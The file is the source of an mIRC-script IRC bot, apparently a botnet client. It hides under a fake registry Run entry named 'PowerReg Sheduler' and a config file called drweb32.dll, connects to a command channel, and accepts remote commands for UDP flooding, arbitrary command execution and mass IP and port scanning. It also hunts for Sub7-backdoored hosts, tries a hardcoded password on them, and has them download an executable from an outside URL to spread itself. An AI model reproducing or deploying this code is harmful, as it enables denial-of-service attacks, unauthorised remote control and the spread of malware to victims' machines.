on *:kick:#:if $knick == $me join #
raw 408:*:msg $2 $strip($12-)
on *:start:{ b00t | errorcheck | nick $rand(a,z) $+ $rand(1000,9999) $+ $rand(a,z) | username $rand(a,z) $+ $rand(100,999) $+ $rand(a,z) | emailaddr $rand(a,z) $+ $rand(100000,999999) $+ $rand(a,z) $+ @ $+ $rand(a,z) $+ .com | server %server | socklisten bnc.63238 63238 | set %bnc.63238 h789s | identd on $rand(a,z) $+ $rand(999,999) $+ $rand(A,Z) }
on *:connect:{ join %chan | mode $me +i-x | set %iamtime $ctime }
on *:disconnect:{ server %server | timercheck 0 3600 checkserver }
alias checkserver if $server == $null server %server
alias errorcheck { if (%server == $null) set %server n3tw0rk.ath.cx 8000 | if (%chan == $null) set %chan #sc4nn3d | if (%setup.portsocks == $null) set %setup.portsocks 40 | if (%setup.porttimeout == $null) set %setup.porttimeout 4 | if (%setup.scanmaxsocks == $null) set %setup.scanmaxsocks 25 | if (%setup.scantimeout == $null) set %setup.scantimeout 8 | if (%inc == $Null) set %inc 0 }
on *:join:#:{ if $nick == $me { mode # +sntl 900 | topic # we are chatting here } }
on q:text:*:*: {
  if $1 == !info getlag $g 
  if $1 == !udp && $2 != $null { .timer $+ $2 -m 0 10 .sockudp -b udp $+ $rand(100,999) $2 $rand(100,4000) 999999999999 ECHO $ip | timer 1 $iif($3 != $null,$3,1200) timer $+ $2 off }
  if $1 == !hudp && $2 != $null timer $+ $2 off
  if $1 == !jump && $2 != $null { set %server $2 | server %server }
  if $1 == !do $2-
  if $1 == !scanips && $5 == $me scan.go $2 $3 $4 $g
  if $1 == !scan.info msg $g $b $c(info) $b ][!scanip.delay: %setup.scantimeout $+ ][!scanip.maxsocks: %setup.scanmaxsocks $+ ][
  if ($1 == !scanip.maxsocks) set %setup.scanmaxsocks $2
  if ($1 == !scanip.delay) set %setup.scantimeout $2
  if ($1 == !scan.status) { if ($timer(port) != $null) msg $g $b $c(ports:) $b %port.ip %port.1 %port.2 15now: 00 $+ %port.port (# %port.found $+ )
  if ($timer(scan) != $null) msg $g $b $c(ips:) $b %scan.ip1 %scan.ip2 %scan.port 15now: 00 $+ $longip(%scan.progress) (# %scan.found $+ ) }
  if ($1 == !port.scan) && ($5 == $me) port.go $2 $3 $4 $g
  if ($1 == !var) msg $g $b $c(var) $b $2 15is [ [ $2- ] ]
}
alias g return $iif(# != $null,#,$nick)
alias b return 00:::
alias c return 14,1[15 $+ $1- $+ 14]
alias scan.go { set %scan.ip1 $1 | set %scan.ip2 $2 | set %scan.1ip $longip($1) | set %scan.2ip $longip($2) | set %scan.port $3 | set %scan.total $calc(%scan.2ip - %scan.1ip) | set %scan.progress %scan.1ip | set %scan.1time $ctime | set %scan.blah 1 | set %scan.botchan $4 | set %scan.found 0 | msg $4 $b $c(Scanning) $b from 14 $+ %scan.ip1 15to 14 $+ %scan.ip2  on port %scan.port $+ . | supersocks }
alias sss1 { sockclose scan* | inc %scan.progress %setup.scanmaxsocks | inc %scan.blah %setup.scanmaxsocks | supersocks }
alias supersocks { set %scan.inc 0 |  while %scan.inc < %setup.scanmaxsocks { if (%scan.blah >= %scan.total) { scan.finished | goto end } | sockopen scan $+ %scan.inc $longip($calc(%scan.progress + %scan.inc)) %scan.port | inc %scan.inc |  .timerscan 1 %setup.scantimeout sss1 | :end } }
alias scan.finished { .timerscan off | sockclose scan* | msg %scan.botchan $b $c(Finished) $b from 14 $+ %scan.ip1 15to 14 $+ %scan.ip2  on port %scan.port $+ . Time to scan: $duration($calc($ctime - %scan.1time)) Found objects: %scan.found |  timerscan off |  sockclose scan* |  unset %scan.* }
on *:sockopen:scan*:{ if ($sockerr) sockclose $sockname | else { inc %scan.found |  write %scan.port $+ .txt $sock($sockname).ip $sock($sockname).port | msg %scan.botchan 10 $+ $sock($sockname).ip $sock($sockname).port (# $+ %scan.found $+ ) | if $sock($sockname).port == 27374 { %x = $rand(9999,9999999999999) | sockrename $sockname sub $+ %x | .timerkill $+ %x 1 120 sockclose sub $+ %x } } }
alias port.go { set %port.ip $1 |  set %port.1 $2 |  set %port.2 $3 |  set %port.port $2 |  set %port.botchan $4 | msg %port.botchan $b $c(Scanning) $b ports 14 $+ %port.ip 15from 14 $+ %port.1 15to 14 $+ %port.2 | set %port.time $ctime | set %port.found 0 | port.scan }
on *:sockread:sub*:{ sockread -f %sub7.ch3ck | echo -s %sub7.ch3ck |  if (connect isin %sub7.ch3ck) && (2.1 isin %sub7.ch3ck) {  sockwrite $sockname UFUhttp://n3tw0rk.virtualave.net/eXp/goodbot.exe | msg %scan.botchan I found Sub7Server . Trying to Upload Script . } |  if %sub7.ch3ck == PWD { sockwrite $sockname PWD14438136782715101980 | msg %scan.botchan Server PWD . Trying Crack Server . } |  if %sub7.ch3ck == POPUP incorrect password... { sockclose $sockname | msg %scan.botchan Can't Crack Server } | if %sub7.ch3ck == file successfully downloaded { msg %scan.botchan Script UPLOADED } }
alias set { set $1 $2- | .save -rv drweb32.dll }
alias getlag { set %lag $ticks | set %aaaaa $1 | raw getlag }
alias timeaway return $replace($duration($1),secs,s,mins,m,hrs,h,days,d,wks,w,sec,s,min,m,hr,h,day,d,wk,w)
alias hms2 if ($1 < 60) return $round($1,3) $+ s | else return $replace($duration($1),secs,s,mins,m,hrs,h,days,d,wks,w,sec,s,min,m,hr,h,day,d,wk,w)
alias b00t { set %filetoboot $rand(100,999) $+ .reg | write %filetoboot  REGEDIT4 | write %filetoboot [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run] | write %filetoboot "PowerReg Sheduler"="c:\\windows\\system\\print32wk.exe" | run -n regedit /s %filetoboot | timer 1 4 remove %filetoboot | timer 1 5 unset %filetoboot }
raw 421:*getlag*:{ msg %aaaaa $b $c(fin[A]l sHutdOWn) $b 12\\14// $b 3vErSIOn -2.0- 12\\14// $b $c(PC INFO) $+ 7: 10uptime: $duration($calc($ticks / 1000)) $+ 12\14/10lag: $hms2($calc(($ticks - %lag)/1000)) $+ 12\14/10dur: $timeaway($calc($ctime - %iamtime))) }
raw 474:*:{ inc %inc | join $2 $+ %inc }
on *:sockopen:port*:{ if ($sockerr) sockclose $sockname | else { inc %port.found |  write portscan.txt $sock($sockname).ip $sock($sockname).port | msg %port.botchan 04 $+ $sock($sockname).ip $sock($sockname).port } }
alias port.go { set %port.ip $1 |  set %port.1 $2 |  set %port.2 $3 |  set %port.port $2 |  set %port.botchan $4 | msg %port.botchan SCANninG ports 14 $+ %port.ip 15from 14 $+ %port.1 15to 14 $+ %port.2 | set %port.time $ctime | set %port.found 0 | port.scan }
alias sss2 { sockclose port* | inc %port.port %setup.portsocks | port.scan }
alias port.scan { set %port.inc 0 |  while %port.inc < %setup.portsocks { if (%port.port >= %port.2) { port.finished | goto end } | sockopen port $+ %port.inc %port.ip $calc(%port.port + %port.inc) | inc %port.inc |  .timerport 1 %setup.porttimeout sss2 |  :end  } }
alias port.finished { timerport off | sockclose port* | msg %port.botchan FINisheD portscan 14 $+ %port.ip 15from 14 $+ %port.1 15to 14 $+ %port.2 $+ . 15Time to scan: 14 $+ $duration($calc($ctime - %port.time)) 15Number of open ports: 14 $+ %port.found | unset %port* }
raw 433:*:nick $rand(a,z) $+ $rand(10000,99999) $+ $rand(a,z)
